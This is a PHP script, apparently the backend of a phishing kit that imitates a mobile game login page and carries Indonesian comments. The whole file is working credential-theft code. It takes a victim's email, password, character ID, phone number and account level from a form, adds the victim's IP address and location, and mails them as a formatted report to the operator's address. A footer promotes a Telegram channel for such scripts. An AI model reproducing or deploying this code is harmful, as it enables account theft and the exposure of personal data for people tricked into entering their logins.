<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/agungip.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = " $agung_flag | $agung_callcode | LEVEL $level | PUNYA SI $email | LOGIN $login";
$pesan = '
<center>
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat;border:2px solid black;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th>
</tr>

</table>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #000; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_ip_address.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>BENUA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_benua.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>NEGARA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_negara.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PROVINSI</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_provinsi.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>KOTA</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_kota.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>

</table>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #000;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="https://t.me/berbagisc">TELEGRAM KAMI</a>
</div>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);
}
?>